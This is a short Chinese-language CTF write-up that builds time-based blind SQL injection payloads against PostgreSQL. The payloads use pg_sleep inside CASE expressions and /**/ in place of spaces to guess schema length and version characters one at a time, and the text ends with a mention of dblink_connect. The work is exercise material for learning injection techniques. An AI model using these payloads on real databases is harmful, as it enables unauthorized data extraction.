输入payload后延迟了5s，并且hint告诉我们flag在文件里，那意思就是需要读文件，这里判断是盲注+读文件，这里就需要一个if来逐位猜

 

```

#mysql的

if(expr1,result1,result2);

#如果expr1满足，result1，否则result2

 

#对于postgresql

select case when(expr1) then result1 else result2 end;

```

 

```

select case when 1=1 then (select/**/1 from pg_sleep(5)) else (select  from pg_sleep(0) end

```

 

那根据这个题就可构造为

 

```

1'/**/and/**/1=(case/**/when/**/2>1/**/then/**/(select/**/1/**/from/**/pg_sleep(5))/**/else/**/1/**/end)/**/--

```

 

这里会触发sleep(5)

 

我们们把条件改成假

 

```

1'/**/and/**/1=(case/**/when/**/1>2/**/then/**/(select/**/1/**/from/**/pg_sleep(5))/**/else/**/(select/**/1/**/from/**/pg_sleep(0)/**/end)/**/--

```

 

这里就会触发sleep(0)，我们这里试试长度的判断

 

```

1'/**/and/**/1=(case/**/when/**/(length((substr((select/**/CURRENT_SCHEMA()),1,1)))=1)/**/then/**/(select/**/1/**/from/**/pg_sleep(5))/**/else/**/(select/**/1/**/from/**/pg_sleep(0))/**/end)/**/--

```

 

```

1'/**/and/**/1=(case/**/when/**/(ascii((substr((select/**/version()),1,1)))>1)/**/then/**/(select/**/1/**/from/**/pg_sleep(5))/**/else/**/(select/**/1/**/from/**/pg_sleep(0))/**/end)/**/--

```

`dblink`是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。

`dblink_connect` -- 打开一个到远程数据库的持久连接
